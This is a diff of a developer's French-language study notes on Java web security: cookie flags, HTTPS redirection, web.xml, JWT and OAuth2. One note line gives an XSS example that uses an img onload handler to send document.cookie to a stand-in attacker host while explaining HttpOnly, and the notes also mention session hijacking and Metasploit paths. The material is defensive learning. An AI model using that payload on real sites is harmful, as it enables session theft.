@@ -1,11 +1,8 @@
+(?=.*https)(?=.*redir)
 AFAIRE : 
-pas etendu spring form ; capitaliser get spring
+capitaliser get spring
 lire : C:\Users\ut2sn0\My_IT_Applications\apprentissage\20190716_Kubernetes_Live_Demo_in_SQY.pdf
-(?=.*conf)(?=.*proxyhier)
-Hashmap/HashTable 
-lock reentrant
-immutable interet car pas de pb de concurrence
-comment eviter transitive
+comment eviter transitive pb maven
 prototype Array
 select innerjoin
 classloader
@@ -2441,7 +2438,7 @@ pour recuperer de manière sympa les parametres renvoyes par une page web:
 							}
 						}
 
-  recuperer un cookie a partir du request: affichier la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
+  recuperer un cookie a partir du request: afficher la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
                       Cookie[] cookies = request.getCookies();
                         String cookieName = SAPCookie;
                         String defaultValue = 1;
@@ -3401,6 +3398,9 @@ web.xml : webxml :
             session-config Definit un delai maximal d'inactivite pour les sessions.  
             		    sous <web-app>:<session-config>
                 	<session-timeout>15</session-timeout>
+                	   <cookie-config>
+                	       <secure>true</secure> // fait pareil que LINKlizifoizf  (a partir de servlet3.0)
+                	  <cookie-config>
                 </session-config>
             mime-mapping Definit une association entre les fichiers publics de l'application et des types MIME.  
             welcome-file-list Definit la ressource à retourner par defaut au client si aucune ressource n'est specifiee.  
@@ -3467,7 +3467,7 @@ web.xml : webxml :
                             </web-resource-collection>
                                 		
                                     <user-data-constraint>
-                                			<description>Protection should be CONFIDENTIAL</description>
+                                			<description>Protection should be CONFIDENTIAL</description> // pour que toute requete soit redirigée automatiquement de http vers https LINKjgjgjgjndndnd
                                 			<transport-guarantee>CONFIDENTIAL</transport-guarantee>
                                 		</user-data-constraint>
                                 		ou 
@@ -15160,6 +15160,7 @@ hacking : haking : hack :
               la parrade est: 
                       - Utiliser des jetons de validité dans les formulaires: faire en sorte qu'un formulaire posté ne soit accepté que s'il a été produit quelques minutes auparavant: le jeton de validité en sera la preuve. Le jeton de validité doit être transmis en paramètre et vérifié côté serveur.
                       - Effectuer une vérification du référent dans les pages sensibles: connaître la provenance du client permet de sécuriser ce genre d'attaques. Ceci consiste à bloquer la requête du client si la valeur de son référent est différente de la page d'où il doit théoriquement provenir.
+        Session hijacking: si pas en https: hacker peut sniffer sur le reseau mon jsessionid ou autre. Pour eviter faire LINKlizifoizf                      
     metasploitable:
         /usr/share/metasploit-framework
         chemin prog pour pirater:     /modules/exploits/...
@@ -15180,14 +15181,14 @@ cookies :
     
     dans le serveur setter le httponly: LINKcooklskjhh
                         NewCookie hraCookie= new NewCookie(UserManagementConstants.CONNECTION_ID, getDatasourceSessionIdFromContext(), "/", getCookieDomain(), null, -1, httpRequest.isSecure());
-                        return javax.ws.rs.core.Response.seeOther(go).header("Set-Cookie",hraCookie.toString()+"; Secure; HttpOnly").build();
+                        return javax.ws.rs.core.Response.seeOther(go).header("Set-Cookie",hraCookie.toString()+"; Secure; HttpOnly").build();                                              |_revoit true si on est en https
                           ou
                                         	final String cookiePath = "/";
                                       		final String cookieDomain = getCookieDomain();
-                                      		Cookie cookie = new Cookie(name, value);
+                                      		Cookie cookie = new Cookie(name, value); //exemple: ("bla,"bli");
                                       		cookie.setPath(cookiePath);
-                                      		//cookie.setSecure(httpRequest.isSecure());
-                                      		cookie.setSecure(true);
+                                      		//cookie.setSecure(httpRequest.isSecure()); //.isSecure() renvoit true si on est en https 
+                                      		cookie.setSecure(true); //setSecure: le cookie n'est transmis sur le reseau que si on est en https LINKlizifoizf
                                       		cookie.setHttpOnly(httpOnly);
 letsencrypt :
       les logs sont sous /var/log/letsencrypt/letsencrypt.log
@@ -23189,7 +23190,12 @@ pour merger des cellules avec xspreadsheet: (f1j11swing.jar)
 					book.setSelection(1, 3, 2, 4);
 					book.setCellFormat(cf);
 					// Merges range D2:E3 (horizontal & vertical)
-pour lire un fichier csv utiliser la librairie opncsv-1.8.jar avec la class CSVReader qui possede une methode "readNext"
+pour lire un fichier csv utiliser la librairie opncsv-4.6.jar avec la class CSVReader qui possede une methode "readNext" lire doc:http://opencsv.sourceforge.net/#core_concepts
+                                                  <dependency>
+                                                    <groupId>com.opencsv</groupId>
+                                                    <artifactId>opencsv</artifactId>
+                                                    <version>4.6</version>
+                                                  </dependency>
 			private CSVReader csvReadingFile(FileInputStream fileInputStream) {
 			CSVReader csvReader = null;
 			NON!!! il faut utiliser les BufferedInputStream et output stream parce que buffered reader encode!
@@ -25342,6 +25348,8 @@ si php n'est plus interpreté:
 redirection: expression regulières 
       RedirectMatch ^/shop(.*)$ https://www.wenhuaduverge.com$1 redirige tout ce qui se termine par /shopquelquechose vers wenhuaduverge.comquelquechose
 rediriger tout http vers https (j'ai essaye avec .htaccess mais n'a pas marche)
+      meth0: web.xml
+          voir LINKjgjgjgjndndnd
       meth1: 
         <VirtualHost...>
             RewriteEngine on
@@ -25457,7 +25465,7 @@ Pour rediriger les requetes du port 8080 de apache vers jetty:
                   RewriteCond "%{REMOTE_HOST}"  "^host1"  [OR] //si l'URL = ???ACOMPRENDRE expressionRegulière ou
                   RewriteCond %{HTTP_HOST} production-sodec.fr.auchan.com [OR] //si l'URL = ???ACOMPRENDRE expressionRegulière ou
                   RewriteCond "%{REMOTE_HOST}"  "^host3"       //si l'URL = ???ACOMPRENDRE expressionRegulière alors
-                  RewriteRule ^/hra-space$ hra-space/cas [R] //rediriger expresssionReguliere vers destination
+                  RewriteRule ^/hra-space$ hra-space/cas [R] //rediriger expressionReguliere vers destination
         DocumentRoot /var/www/www.wenhuaduverge.com/
       <Directory "/var/www/www.wenhuaduverge.com/shop">
         Options -Indexes FollowSymLinks
@@ -30517,7 +30525,7 @@ JWT :
     stateless: pas besoin de session ni de base de donnée avec l'utilisateur dedans. Le token suffit a valider que je suis Laurent !=cookie de session ou le serveur conserve une table des sessions.
     bonne pratique: ajouter dans le payload sub:9830984,exp:0938098Z: subscribe et expire date shortlife: duree de vie courte.: du coup necesite background authentication a chaque requette: pour ça utiliser librairies.
                         toujour mettre aud: = audience = pour quel service/serveur uniquement sert ce token?
-                        toujours utiliser secret!= ou cle publique != par service/serveur
+                        toujours utiliser secret!= ou cle publique!= par service/serveur
                         toujours refuser les token avec algo:null. il faut qu'il y ait un algo. UN ALGO ET UN SEUL
      archi: [1Client(Mon Browser)]<----1-------->[1Authentificationservice pour tous: il a 1 clé privée differente pour chaque RessourceService a qui il donne la cle publique correspondante.]
                                    \___2_______>[xRessourcesServices: chacune a une clé publique.] 
@@ -30538,8 +30546,10 @@ est fait pour gerer que authorization à la base. Pas pour Authentification: On 
     EDSN transmet à FID: -scope // droits necessaires
     autres modes :
         ImplicitMode: ne passe que par le frontchanell: on bypasse la partie "ask code"-"recieve code": on obtien direct l'accessToken (pour les apps qui sont pure javascript)
-        Resource Owner password[crediential] flow : ne passe que par back (pour la compat des vieilles applis   |_client demande à l'authorizationServer un accessToken direct
-        Client credientials flow : ne passe que par back(pour les échanges entre machines uniquement)           |
+        Resource Owner password[crediential] flow : ne passe que par back (pour la compat des vieilles applis et de confiance   |
+                                              homme envoit user/password au client EDSN(prd la place du client_secret je crois) |_client demande à l'authorizationServer un accessToken direct
+        Client credientials flow : ne passe que par back(pour les échanges entre machines uniquement)                           |
+                                                   
     Run:
       USER va sur EDSN(Client)
       (facultatif)EDSN presente un bouton pour rediriger vers FID(AuthenticationServer). Si clique 
@@ -30572,21 +30582,31 @@ est fait pour gerer que authorization à la base. Pas pour Authentification: On 
     EDSN envoit ResponseType=Token ou =Token_ID ---------------------------------frontchannel------------>>>>>
     =1ere étape si ImplicitMode                                                                                             
                                                                                                               FID vérifie que code n'est pas l'AuthorisationCode n'a pas été hacké grâce à client_secret
-                                              <<<<<<<<<<<<<<<<<<-----backchannel/frontSiImplicitMode--------- FID renvoit l’AccessToken(scopé&expirable)   +           Token_ID si OpenID =JWTSigné=JWS (AuthenticationServer doit supporter)
-                                                                                                                          expiration=xms     +TokenType=bearer								 Signature avec SecretKey 
-    EDSN peut utiliser Token_ID:utilisateur est authentifié.                                                                                                                                   ou
-    EDSN demande une authorisation                                                                                                                                                             Signature avec paire de clé assymetriquesj,n (donc clé privée)
-                   --->GET                                                                                           
+                                 <<<<<<<<<<<<<<<<<<<<<<<<<-----------backchannel/frontSiImplicitMode--------- FID renvoit l’AccessToken(scopé&expirable)   +                Token_ID si OpenID =JWTSigné=JWS (AuthenticationServer doit supporter)
+                                                               HTTPS-SSL si Bearer                                        expires_in=xms(stokéDsDBSaufSi) +TokenType=      								 Signature avec SecretKey 
+                                                                                                                          stocké en base sauf si durée            bearer                       ou
+                                                                                                                          vie tres courte                                                  Signature avec paire de clé assymetriques (donc clé privée)
+                                                                                                                                                                   ou
+                                                                 pasBesoin si Mac                                           utilisation unique                      mac                          
+                                                                                                                            chaque fois
+    
+    EDSN peut utiliser Token_ID:utilisateur est authentifié.                                                                                                                                   
+    EDSN demande une authorisation                                                                                                                                                              
+                   --->GET                                                                                                                
                    --->GET  plusieurs fois tant que expir OK.
                    --->GET----------backchannel/frontSiImplicitMode-----renvoit l'AccessToken qui contient le scope----------->>>>>>FIDx(Ressource) Vérifie que l'AccessToken est valide Puis Execute l'action ou                                                                                            
                                                   |                       GET url.FIDx/toto/endpoint                                                                            |
-                                                  |                       Authorization:Bearer blablaMonAccessTockenblabla // dans le header(bearer pour dire que c du oauth2.0)| 
+                                                  |                  Authorization:Bearer ou Mac blaMonAccessTockenblabla // dans le header(bearer pour dire que c du oauth2.0) | 
                                                   |                         OU renvoit                                                                                          |
                                                   |                       getUserInfo si a reçu l'Token_ID                                                                      |
                                            s'assurer que le token ne peut pas                                                                                                   | 
                                            être pompé hors du browser                                                                                                           |
                                                                                                                                                                                 |
                           <<<<<<<<<<<<<<<<<<<<---------------------info demandée(restreinte au scope) backchannel---------------------------------------------------------------------retourne------FID(AuthenticationServer) renvoit un RefreshToken à EDSN(Client)
+                          
+                          
+                   client username/password->---------------------------------------------------------------------------------------------------------------------------------------->>>>>>>>>>>> si Bearer,capable revoquer son access token (stoké en base) 
+                          
 
 Kerberos : 
     utilisation de d'apache mod_auth_kerb: 
